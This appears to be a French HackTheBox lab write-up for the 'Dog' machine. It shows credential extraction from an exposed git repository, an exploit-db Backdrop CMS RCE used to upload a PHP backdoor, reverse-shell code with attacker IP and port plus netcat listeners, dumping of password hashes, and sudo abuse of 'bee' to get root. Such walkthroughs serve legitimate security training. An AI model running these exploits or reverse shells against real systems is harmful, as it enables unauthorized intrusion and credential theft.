---
title: HTB | Dog
description: Dog is an easy-rated Linux machine that involves reading sensitive information through an exposed git repository and exposing credentials to get administrator access to BackdropCMS. The admin privileges allow an attacker to exploit Remote Code Execution by uploading a malicious archive containing a PHP backdoor to gain an initial foothold. The johncusack user account also reuses the BackdropCMS password. After compromising the johncusack account, the attacker finds that the user can run the bee executable with sudo privileges, which allows the attacker to gain root privileges.
slug: dog-htb
date: 2025-03-09 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Dog cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Dog</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.11.58</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Users
```bash
mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop
tiffany : BackDropJ2024DS2024
johncusack : BackDropJ2024DS2024
```

## Enumeration

### nmap
```bash
┌──(kali㉿kali)-[~/htb/Dog]
└─$ nmap -sC -sV -An -T4 -vvv -p- 10.10.11.58

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEJsqBRTZaxqvLcuvWuqOclXU1uxwUJv98W1TfLTgTYqIBzWAqQR7Y6fXBOUS6FQ9xctARWGM3w3AeDw+MW0j+iH83gc9J4mTFTBP8bXMgRqS2MtoeNgKWozPoy6wQjuRSUammW772o8rsU2lFPq3fJCoPgiC7dR4qmrWvgp5TV8GuExl7WugH6/cTGrjoqezALwRlKsDgmAl6TkAaWbCC1rQ244m58ymadXaAx5I5NuvCxbVtw32/eEuyqu+bnW8V2SdTTtLCNOe1Tq0XJz3mG9rw8oFH+Mqr142h81jKzyPO/YrbqZi2GvOGF+PNxMg+4kWLQ559we+7mLIT7ms0esal5O6GqIVPax0K21+GblcyRBCCNkawzQCObo5rdvtELh0CPRkBkbOPo4CfXwd/DxMnijXzhR/lCLlb2bqYUMDxkfeMnmk8HRF+hbVQefbRC/+vWf61o2l0IFEr1IJo3BDtJy5m2IcWCeFX3ufk5Fme8LTzAsk6G9hROXnBZg8=
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM/NEdzq1MMEw7EsZsxWuDa+kSb+OmiGvYnPofRWZOOMhFgsGIWfg8KS4KiEUB2IjTtRovlVVot709BrZnCvU8Y=
|   256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPMpkoATGAIWQVbEl67rFecNZySrzt944Y/hWAyq4dPc
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-git: 
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
| http-robots.txt: 22 disallowed entries 
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
| /user/password /user/login /user/logout /?q=admin /?q=comment/reply 
| /?q=filter/tips /?q=node/add /?q=search /?q=user/password 
|_/?q=user/register /?q=user/login /?q=user/logout
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Home | Dog
```

## Foothold

### website with .git files | git-dumper
On trouve un serveur web avec un dossier .git. On peut donc utiliser git-dumper pour récupérer des fichiers et faire un git log eventullement pour trouver des infos:


### mysql credentials
Après analyse des fichiers, on trouve des credentials dans le fichier settings.php :

> 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop'
```bash
┌──(kali㉿kali)-[~/htb/Dog]
└─$ git-dumper http://10.10.11.58/.git/ ./website
    
┌──(kali㉿kali)-[~/htb/Dog]
└─$ cd website/
    
┌──(kali㉿kali)-[~/htb/Dog]
└─$ grep -rni "\$database ="
website/settings.php:15:$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
website/core/modules/simpletest/tests/database_test.test:3653:    $database = Database::getConnection();
website/core/modules/system/system.admin.inc:2625:  $database = $databases['default']['default'];
website/core/includes/install.inc:491:      $database = $modified_connection_info['default']['database'];
website/core/includes/install.inc:796:  $database = NULL;
website/core/includes/install.core.inc:904:    $database = $databases['default']['default'];
website/core/includes/install.core.inc:973:  $database = isset($databases['default']['default']) ? $databases['default']['default'] : array();
website/core/includes/install.core.inc:1022:  $database = $form_state['values'][$driver];
```

### Tiffany
> "tiffany@dog.htb"
```bash
┌──(kali㉿kali)-[~/htb/Dog/website]
└─$ grep -rni "@dog.htb"                                                         
.git/logs/HEAD:1:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000  commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases
.git/logs/refs/heads/master:1:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000     commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases
files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:12:        "tiffany@dog.htb"
```

### Backdrop CMS - Authenticated RCE
Grâce au compte administrateur de tiffany, on va pouvoir exploiter une RCE de backdrop CMS v1.27.1 et uploader un fichier shell.php :

```bash
┌──(kali㉿kali)-[~/htb/Dog]
└─$ searchsploit backdrop cms
---------------------------------------------------------
 Exploit Title  |  Path
---------------------------------------------------------
Backdrop CMS 1.20.0 - 'Multiple' Cross-Site Request Forgery (CSRF)    | php/webapps/50323.html
Backdrop CMS 1.23.0 - Stored XSS       | php/webapps/51905.txt
Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE)    | php/webapps/52021.py
Backdrop Cms v1.25.1 - Stored Cross-Site Scripting (XSS)              | php/webapps/51597.txt
---------------------------------------------------------
Shellcodes: No Results
    
┌──(kali㉿kali)-[~/htb/Dog]
└─$ searchsploit -m php/webapps/52021.py
  Exploit: Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE)
      URL: https://www.exploit-db.com/exploits/52021
     Path: /usr/share/exploitdb/exploits/php/webapps/52021.py
    Codes: N/A
 Verified: True
File Type: Python script, Unicode text, UTF-8 text executable
Copied to: /home/kali/htb/Dog/52021.py               

┌──(kali㉿kali)-[~/htb/Dog]
└─$ mv 52021.py RCE.py
    
┌──(kali㉿kali)-[~/htb/Dog]
└─$ python3 RCE.py http//dog.htb
Backdrop CMS 1.27.1 - Remote Command Execution Exploit
Evil module generating...
Evil module generated! shell.zip
Go to http//dog.htb/admin/modules/install and upload the shell.zip for Manual Installation.
Your shell address: http//dog.htb/modules/shell/shell.php
```
Quand on va a l'addresse specifier pour installer le module avec le code malicieux, on trouve un message :
> The Zip PHP extension is not loaded on your server. You will not be able to download any projects using Project Installer until this is fixed.
Impossible donc d'installer un module .zip comme le propose l'exploit. Cependant, on trouve un bouton un peu plus bas :
> Manual Installation
> Upload a module
Ensuite on met notre zip mais on a:
> The specified file shell.zip could not be uploaded. Only files with the following extensions are allowed: tar tgz gz bz2.
On remplace donc notre .zip par un .tar : ça fonctionne ! Notre code php est bien présent à l'addresse spécifié par l'exploit python:
> http//dog.htb/modules/shell/shell.php

Pour obtenir un reverse shell stable facilement, on va uploader directement un code php 'php-reverse-shell.php' provenant de github en modifiant notre ip et port:
```bash
## php-reverse-shell.php
...
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.10';  // CHANGE THIS
$port = 1337;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
...
```
On obtient un shell en tant que www-data :
```bash
## Firefox
http://dog.htb/modules/shell/shell.php

-----------------------------------------

┌──(kali㉿kali)-[~/htb/Dog]
└─$ nc -lnvp 1337                            
listening on [any] 1337 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.11.58] 46688
Linux dog 5.4.0-208-generic #228-Ubuntu SMP Fri Feb 7 19:41:33 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 14:57:07 up 17:27,  0 users,  load average: 0.05, 0.03, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@dog:/$ export TERM=xterm
export TERM=xterm
www-data@dog:/$ ^Z
zsh: suspended  nc -lnvp 1337
                                                                                                                                                                                                                                          
┌──(kali㉿kali)-[~/htb/Dog]
└─$ stty raw -echo; fg
[1]  + continued  nc -lnvp 1337

www-data@dog:/$ whoami
www-data
```

## www-data -> johncusack

### Mysql connection
On peut se connecter a la base de données mysql rapidement avec les credentials trouvés précédemment:
```bash
www-data@dog:/$ mysql -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 12917
Server version: 8.0.41-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2025, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> use backdrop;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> select name,pass,mail from users;
+-------------------+---------------------------------------------------------+----------------------------+
| name              | pass                                                    | mail                       |
+-------------------+---------------------------------------------------------+----------------------------+
|                   |                                                         |                            |
| jPAdminB          | $S$E7dig1GTaGJnzgAXAtOoPuaTjJ05fo8fH9USc6vO87T./ffdEr/. | jPAdminB@dog.htb           |
| jobert            | $S$E/F9mVPgX4.dGDeDuKxPdXEONCzSvGpjxUeMALZ2IjBrve9Rcoz1 | jobert@dog.htb             |
| dogBackDropSystem | $S$EfD1gJoRtn8I5TlqPTuTfHRBFQWL3x6vC5D3Ew9iU4RECrNuPPdD | dogBackDroopSystem@dog.htb |
| john              | $S$EYniSfxXt8z3gJ7pfhP5iIncFfCKz8EIkjUD66n/OTdQBFklAji. | john@dog.htb               |
| morris            | $S$E8OFpwBUqy/xCmMXMqFp3vyz1dJBifxgwNRMKktogL7VVk7yuulS | morris@dog.htb             |
| axel              | $S$E/DHqfjBWPDLnkOP5auHhHDxF4U.sAJWiODjaumzxQYME6jeo9qV | axel@dog.htb               |
| rosa              | $S$EsV26QVPbF.s0UndNPeNCxYEP/0z2O.2eLUNdKW/xYhg2.lsEcDT | rosa@dog.htb               |
| tiffany           | $S$EEAGFzd8HSQ/IzwpqI79aJgRvqZnH4JSKLv2C83wUphw0nuoTY8v | tiffany@dog.htb            |
+-------------------+---------------------------------------------------------+----------------------------+
9 rows in set (0.00 sec)
```

### john, jobert - hashcat bruteforce passwords

On a les users suivant pouvant avoir un shell sur le serveur :
```bash
www-data@dog:/$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
jobert:x:1000:1000:jobert:/home/jobert:/bin/bash
johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash
```
On va donc tenter de cracker en priorité les mots de passe de jobert et de john, à l'aide de hashcat:
```bash
$S$E/F9mVPgX4.dGDeDuKxPdXEONCzSvGpjxUeMALZ2IjBrve9Rcoz1
$S$EYniSfxXt8z3gJ7pfhP5iIncFfCKz8EIkjUD66n/OTdQBFklAji.
```
Aucun résultat avec rockyou ! On abandonne cette piste (Meme pour les autres hachage)

### johncusack
En essayant toujours le meme mot de passe: `BackDropJ2024DS2024` avec john, ça fonctionne ! On peut ensuite se connecter en ssh avec cet utilisateur sur la machine linux :
```bash
┌──(kali㉿kali)-[~/htb/Dog]
└─$ ssh johncusack@dog.htb         
The authenticity of host 'dog.htb (10.10.11.58)' can't be established.
ED25519 key fingerprint is SHA256:M3A+wMdtWP0tBPvp9OcRf6sPPmPmjfgNphodr912r1o.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'dog.htb' (ED25519) to the list of known hosts.
johncusack@dog.htb's password: <------------ BackDropJ2024DS2024
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)
...
...
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sun Mar 9 08:36:06 2025 from 10.10.14.2
johncusack@dog:~$ whoami
johncusack
johncusack@dog:~$ cat user.txt 
cb5b.....1388
```

## Privilege escalation

### johncusack : 'bee' as superuser
On peut executer le binaire "/usr/local/bin/bee" en tant que super utilisateur :
```bash
johncusack@dog:~$ sudo -l
[sudo] password for johncusack: 
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee

```
On regarde les options pour la commande bee :
```bash
johncusack@dog:/var/www/html$ sudo bee
🐝 Bee
Usage: bee [global-options] <command> [options] [arguments]

Global Options:
 --root
 Specify the root directory of the Backdrop installation to use. If not set, will try to find the Backdrop installation automatically based on the current directory.

 --site
 Specify the directory name or URL of the Backdrop site to use (as defined in 'sites.php'). If not set, will try to find the Backdrop site automatically based on the current directory.

....
....

 ADVANCED

  eval
   ev, php-eval
   Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.

  php-script
   scr
   Execute an arbitrary PHP file after bootstrapping Backdrop.
```
En regardant de plus près, on trouve deux options intéressantes :
- eval
- php-script

On essaye d'abord php-script qui semble prendre un fichier php en parametre et l'execute :
```bash
johncusack@dog:/var/www/html$ sudo bee php-script

 ✘  Argument 'file' is required. 
```

On essaye alors de créer un revershell php 'shell.php' et de le passer en parametre:
```bash
johncusack@dog:~/.temp$ ls
shell.php
johncusack@dog:~/.temp$ sudo bee php-script shell.php 

 ✘  The required bootstrap level for 'php-script' is not ready. 
```
On reçoit un message d'erreur. Après reflexion, l'idée me vient d'executer un fichier php dans le dossier où se trouve les fichiers php du web server. Peut être que cela peuvent etre modifié et executé ensuite ?
```bash
johncusack@dog:/var/www/html$ sudo bee php-script index.php 

 ℹ  Notice: Constant BACKDROP_ROOT already defined
in include() (line 17 of /var/www/html/index.php).


 ⚠ Warning: Cannot modify header information - headers already sent by (output started at /backdrop_tool/bee/includes/errors.inc:142)
in backdrop_goto() (line 867 of /var/www/html/core/includes/common.inc).
```
Après un essais sur le fichier index.php, il n'y a plus d'erreur ! Il semble bien executer le code dans ce fichier. On peut  alors:
- modifier un fichier tel que index.php et executer un reverse shell
- créer un nouveau fichier php avec un code reverse shell

Cependant, nous n'avons pas les droits pour modifier/creer des fichiers. Seulement www-data peut le faire. Nous avons accès au compte www-data donc pas de problème. On crée un fichier s.php avec un code pour ouvrir un reverse shell, et ça fonctionne :
```bash
johncusack@dog:/var/www/html$ sudo bee php-script s.php 
johncusack@dog:/var/www/html$ 
 ℹ  Notice: Undefined variable: daemon
in printit() (line 184 of /var/www/html/s.php).

Successfully opened reverse shell to 10.10.14.10:1338

 ℹ  Notice: Undefined variable: daemon
in printit() (line 184 of /var/www/html/s.php).
```
On obtient bien un shell en tant que root :
```bash
┌──(kali㉿kali)-[~/htb/Dog]
└─$ nc -lnvp 1338                            
listening on [any] 1338 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.11.58] 39820
Linux dog 5.4.0-208-generic #228-Ubuntu SMP Fri Feb 7 19:41:33 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 15:29:16 up 18:00,  2 users,  load average: 0.02, 0.05, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
johncusa pts/2    10.10.14.10      15:19    4.00s  0.16s  0.16s -bash
johncusa pts/3    10.10.16.2       15:21   35.00s  0.05s  0.05s -bash
uid=0(root) gid=0(root) groups=0(root)
/bin/sh: 0: can't access tty; job control turned off
## whoami
root
## cat /root/root.txt
5a2f.....adc2
```